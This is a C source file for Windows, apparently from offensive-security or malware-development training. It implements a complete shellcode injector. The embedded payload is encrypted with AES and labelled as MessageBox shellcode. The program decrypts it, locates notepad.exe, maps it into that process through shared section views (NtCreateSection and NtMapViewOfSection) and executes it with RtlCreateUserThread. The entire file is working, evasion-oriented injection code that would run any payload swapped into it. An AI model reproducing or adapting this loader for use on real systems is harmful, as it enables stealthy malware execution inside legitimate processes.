#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

#define SECTION_ALL_ACCESS 0x000F001F

// MessageBox shellcode - 64-bit
unsigned char key[] = { 0xd5, 0x73, 0x58, 0x7a, 0x75, 0x8e, 0x2b, 0x38, 0x5d, 0xbe, 0xa2, 0x45, 0x1f, 0x4e, 0x96, 0xdd };
unsigned char payload[] = { 0x9a, 0xe5, 0x19, 0xdf, 0xa2, 0xf7, 0xdd, 0x4b, 0x51, 0x41, 0xfc, 0xc7, 0xf4, 0xd3, 0x36, 0x2e, 0xd5, 0x04, 0x4d, 0x06, 0x95, 0xf2, 0xae, 0x68, 0x39, 0x82, 0x13, 0x1f, 0xf2, 0xdc, 0x2c, 0xa6, 0x5d, 0x4a, 0xb6, 0x96, 0x23, 0xc4, 0xc1, 0xb2, 0x83, 0x67, 0x19, 0x0d, 0xbd, 0xce, 0x63, 0x8b, 0xc3, 0x0a, 0xcb, 0xef, 0xe3, 0x07, 0xce, 0xe2, 0x41, 0x83, 0xd1, 0xfb, 0x17, 0x81, 0xf6, 0xe7, 0x48, 0x2b, 0x18, 0x9e, 0x8f, 0xd0, 0xa7, 0x23, 0x71, 0xe7, 0xdd, 0xd6, 0xcf, 0xa2, 0x0b, 0x73, 0x79, 0x9f, 0x91, 0x8b, 0x7d, 0x49, 0xcc, 0x0e, 0x74, 0xa9, 0x0c, 0xf0, 0x88, 0xd9, 0x6a, 0x00 };
unsigned int payload_len = sizeof(payload);

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html#l00186
typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
	PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
typedef NTSTATUS (NTAPI * NtCreateSection_t)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL); 

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html
typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);
	
// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;	


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


int FindTarget(const char * procname) {

	int pid = 0;
	DWORD Procs[1024], bytesReturned, NumOfProcesses;
	TCHAR szProcessName[MAX_PATH];
	
	// Get the list of process identifiers.
	if ( !EnumProcesses(Procs, sizeof(Procs), &bytesReturned) ) 
        return 0;
	
	// Calculate how many process identifiers were returned.
    NumOfProcesses = bytesReturned / sizeof(DWORD);

    for (int i = 0; i < NumOfProcesses; i++ ) {
        if (Procs[i] != 0) {
			// Get a handle to the process.
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Procs[i]);

			// and find the one we're looking for
			if (hProc != NULL) {
				HMODULE hModule;

				if (EnumProcessModules(hProc, &hModule, sizeof(hModule), &bytesReturned)) {
					GetModuleBaseName(hProc, hModule, (LPSTR) szProcessName, sizeof(szProcessName)/sizeof(TCHAR));
					if (lstrcmpiA(procname, szProcessName) == 0) {
						pid = Procs[i];
						break;
					}
				}
				
			}
			CloseHandle(hProc);
        }
    }
	
    return pid;
}


// map section views injection
int InjectVIEW(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	HANDLE hSection = NULL;
	PVOID pLocalView = NULL, pRemoteView = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;

	// create memory section
	NtCreateSection_t pNtCreateSection = (NtCreateSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
	if (pNtCreateSection == NULL)
        return -2;
	pNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// create local section view
	NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
	if (pNtMapViewOfSection == NULL)
		return -2;

	pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_READWRITE);

	// throw the payload into the section
	memcpy(pLocalView, payload, payload_len);
	
	// create remote section view (target process)
	pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);

	// printf("wait: pload = %p ; rview = %p ; lview = %p\n", payload, pRemoteView, pLocalView);
	// getchar();

	// execute the payload using RtlCreateUserThread
	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
	if (pRtlCreateUserThread == NULL)
		return -2;
        
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, NULL, &hThread, &cid);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}

    //execute the payload using CreateRemoteThread

    // hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteView, NULL, 0, NULL);
    // if (hThread != NULL) {
    //         WaitForSingleObject(hThread, 500);
    //         CloseHandle(hThread);
    //         return 0;
    // }

	return -1;
}


int main(void) {
    
	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("notepad.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			// Decrypt and inject payload
			AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
			InjectVIEW(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	} else {
        printf("Notepad.exe not found\n");
    }
	return 0;
}
